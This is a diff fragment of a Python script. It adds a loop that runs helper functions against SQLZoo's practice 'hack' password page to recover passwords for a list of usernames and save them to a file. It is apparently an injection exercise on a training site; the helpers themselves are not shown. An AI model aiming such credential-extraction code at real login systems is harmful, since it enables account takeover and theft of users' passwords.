@@ -663,6 +663,21 @@ def findChar(username, url, charList, i):
 """
 
 
+url = "https://sqlzoo.net/hack/passwd.pl"
+users = ["jake", "pewdiepie", "ian", "eric", "ethan", "ronnie", "dan"] #is there an admin account?
+tabel = "users"
+
+dikt = {}
+for u in users:
+    lst = makeList(u, url)
+    pw = checkPass(u, url, lst, 15)
+    dikt[u] = pw
+
+fileName = "sqlzooUsernamesAndPasswords.txt"
+with open(fileName, 'wt') as o:
+   o.write(dikt)
+
+
 
 
 
